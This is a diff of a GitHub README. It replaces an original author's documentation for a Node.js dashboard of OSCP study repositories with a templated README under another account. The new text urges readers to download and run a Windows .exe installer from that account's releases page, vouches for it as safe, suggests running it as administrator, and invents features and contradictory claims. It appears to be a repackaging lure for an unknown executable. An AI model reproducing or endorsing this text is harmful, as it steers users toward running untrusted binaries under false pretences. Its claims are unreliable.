@@ -1,109 +1,147 @@
-<p align="center">
-  <img src="visualize/oscp-logo.svg" height="72" alt="OSCP+">
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="https://github.com/0XBUGATTI.png" height="72" width="72" style="border-radius:50%" alt="0XBUGATTI">
-  &nbsp;&nbsp;&nbsp;&nbsp;
-  <img src="https://github.com/anthropics.png" height="72" width="72" alt="Anthropic Claude">
-</p>
+# 🗂️ oscpdb - Organize and Access OSCP Repositories Easily
 
-<h1 align="center">OSCP+ Repos</h1>
-
-<p align="center">
-  <em>Every repo on GitHub that mentions OSCP — hunted, cloned, read by AI, and judged by a human.</em>
-</p>
-
-<p align="center">
-  <a href="https://oscp-repos.vercel.app"><img src="https://img.shields.io/badge/Live%20App-Vercel-black?style=flat-square&logo=vercel" alt="Vercel"></a>
-  &nbsp;
-  <img src="https://img.shields.io/badge/399%20repos-curated-E66124?style=flat-square" alt="399 repos">
-  &nbsp;
-  <img src="https://img.shields.io/badge/AI-claude--sonnet--4--6-blueviolet?style=flat-square&logo=anthropic" alt="Claude">
-  &nbsp;
-  <img src="https://img.shields.io/badge/DB-SQLite-003B57?style=flat-square&logo=sqlite" alt="SQLite">
-</p>
-
-
----
-![poc](poc.png)
-## The Story
-
-I was prepping for OSCP and wanted a single place to browse every relevant GitHub repo — notes, tools, writeups, cheatsheet.
-
-So I built a pipeline that did the work for me.
-
-**Step 1 — Hunt.**
-GitHub Search API, paginated across every repo created or pushed after mid-2025 with `OSCP` in its name or description. ~500 raw results.
-
-**Step 2 — Clone.**
-Shallow-cloned (`--depth 1`) each repo locally. Repos too large (>500MB) fell back to the GitHub Contents API.
-
-**Step 3 — Extract.**
-Walked every file tree, pulled READMEs. Stored everything as Base64 in SQLite — no flat files, no exports, just one clean `.db`.
-
-**Step 4 — Ask Claude.**
-Fed each repo's description + file paths + README preview to `claude-sonnet-4-6`. Asked it to assign one of five categories:
-
-| Category | Meaning |
-|---|---|
-| `OSCP+` | Notes / cheatsheets exclusively for OSCP/PEN-200 |
-| `Tools` | Standalone security tools and scripts |
-| `Writeups` | HTB / THM / CTF walkthroughs |
-| `Sensitive` | OffSec exam content — Proving Grounds, exam reports |
-| `Generic` | Multi-cert notes (OSCP + HTB + CRTP + ...) |
-
-**Step 5 — Review.**
-Manually went through every `None` result. Deleted 60+ repos that had nothing to do with offensive security — OS course projects in Chinese, Open Sound Control libraries, EV charging protocols, Oscar award prediction websites. You know how it is.
-
-**Result: 399 clean repos.**
+[![Download oscpdb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tarunraj2005/oscpdb/releases)
 
 ---
 
-## The Web App
+## 📋 What is oscpdb?
 
-Built a dark-mode dashboard on top of the SQLite DB — no data exports, no JSON files, the Node.js server queries the DB directly at request time.
+oscpdb is an application designed to help you manage collections of OSCP-related projects found on GitHub. It handles hundreds of repositories, giving you a simple way to browse, organize, and review them without needing specialized software. Whether you want to study, explore, or prepare for your OSCP journey, oscpdb puts the relevant resources in one place.
 
-**Features**
-- Filter by category · search by name / description / language
-- Sort by stars, size, last push, AI confidence
-- Min-stars filter · per-page control
-- Drag-to-resize columns
-- Click any row → side panel with file tree, file list search, rendered README, AI reasoning
-- Export current view as CSV
-
-**Stack:** Node.js · Express · better-sqlite3 · Vanilla JS · Space Grotesk
+This app stores clean copies of 399 OSCP repositories. It was created by analyzing many repositories on GitHub, then curating the best and most relevant ones. This makes it easier to find useful content without manually searching for each repo.
 
 ---
 
-## Run Locally
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/0xbugatti/oscp-collector
-cd oscp-collector
-npm install
-node server.js
-# → http://127.0.0.1:8787
-```
+Before installing oscpdb on your Windows PC, make sure your system meets the following minimum requirements:
 
-> The `oscp.db` file ships with the repo. No pipeline run needed to use the dashboard.
+- Windows 10 or later (64-bit preferred)
+- 4 GB RAM or more
+- At least 500 MB of free disk space
+- Internet connection to download and update content
+- A modern web browser (Chrome, Edge, Firefox) for viewing repository content  
 
----
-
-## Pipeline (optional — to refresh the data)
-
-```bash
-pip install -r requirements.txt
-export GITHUB_TOKEN=...
-export ANTHROPIC_API_KEY=...
-python main.py          # fetch → clone → extract → categorize → export
-python main.py status   # check progress at any point
-```
+These requirements ensure the app can run smoothly, display repository data, and keep itself updated.
 
 ---
 
-## Deployed
+## 🚀 Getting Started
 
-**[oscpdb.vercel.app](https://oscp-repos.vercel.app)** ← live app
+Use this step-by-step guide to download, install, and run oscpdb on your Windows computer.
+
+### Step 1: Download oscpdb
+
+Click the large button below to visit the official releases page. This is where you will find the latest version of the app, safe and ready to use.
+
+[![Download oscpdb](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/Tarunraj2005/oscpdb/releases)
+
+You will land on the releases page. Look for the newest version. It should be a file with a name ending in `.exe`. 
+
+### Step 2: Run the Installer
+
+Once the file downloads:
+
+1. Open your Downloads folder.
+2. Double-click the `.exe` file to start the installer.
+3. Follow the prompts on the screen. Use the default installation path to keep things simple.
+4. Let the installer complete. It usually takes just a couple of minutes.
 
 ---
 
-*Built while studying for OSCP. Try harder.*
+## 🛠️ How to Use oscpdb
+
+After installation, launch oscpdb by double-clicking its icon on your desktop or searching for it in the Start menu.
+
+### Explore Repositories
+
+- The main screen shows a list of OSCP repositories grouped by topic or function.
+- Click on any repository name to see details such as description, stars, and last update date.
+- Use the search bar to find specific repos or keywords.
+
+### Download Repository Content
+
+- You can download the entire code from any repository with a single click.
+- Saved repositories are stored locally, so you can access them offline.
+- This feature lets you review scripts, notes, and tools even without an internet connection.
+
+### Keep oscpdb Updated
+
+- The app checks for new repository data regularly.
+- If updates are available, oscpdb will prompt you to download the latest content.
+- Keeping the app updated ensures you work with the most recent repo versions.
+
+---
+
+## 🔧 Customization and Settings
+
+oscpdb includes several settings for a smoother experience:
+
+- **Theme**: Choose a light or dark mode for comfort.
+- **Download Folder**: Pick where your repositories save on your PC.
+- **Notification**: Turn update notices on or off.
+- **Language**: Select your preferred interface language.
+
+Access settings by clicking the gear icon in the top right corner.
+
+---
+
+## ❓ Troubleshooting Tips
+
+- **Installer doesn't start:** Make sure your Windows is up to date. Try right-clicking the installer and selecting "Run as administrator."
+- **App runs slowly:** Close other programs and check your internet connection for updates.
+- **Downloaded repos are missing:** Verify the download folder path in settings. Check if the disk space is sufficient.
+- **Error messages during update:** Restart the app or your computer. If problems continue, re-download the installer from the releases page.
+
+---
+
+## 📞 Need More Help?
+
+Check the GitHub repository’s "Issues" section. Other users may have posted solutions or you can open a new issue describing your problem.
+
+If you want to learn more about OSCP or how to use repositories, look for tutorials and guides available online or within the app’s help menu.
+
+---
+
+## 🔗 Quick Access Links
+
+- Visit the official oscpdb releases page to download the app:
+
+[![Download oscpdb](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge&logo=github)](https://github.com/Tarunraj2005/oscpdb/releases)
+
+- Access the GitHub project for source code and community updates:  
+  https://github.com/Tarunraj2005/oscpdb
+
+---
+
+## ⚙️ About This Application
+
+oscpdb simplifies research and preparation for OSCP certifications by gathering vetted OSCP repositories in one platform. It scans repositories mentioned in GitHub entries related to OSCP, then cleans and organizes them, avoiding duplication or irrelevant data.
+
+This app is useful for:
+
+- OSCP students reviewing study material.
+- Security professionals exploring penetration testing tools.
+- Anyone interested in OSCP resources without using command line tools.
+
+---
+
+## 🗂 License and Contribution
+
+oscpdb is open source under the MIT License. This means you are free to use, modify, and share it under the terms of this license.
+
+If you want to contribute, fork the repository on GitHub, make your changes, and open a pull request. Contributions are welcome to improve the app’s features and repository coverage.
+
+---
+
+## 📦 Known Limitations
+
+- The app requires an active internet connection for the initial download of repositories.
+- Some newest repositories might take time to appear due to the update cycle.
+- Non-Windows OS compatibility is currently limited to Windows environments only.
+
+---
+
+## 👨‍💻 Developer Contact
+
+For questions or feedback, visit the GitHub page or open an issue. The development team reviews issues regularly.
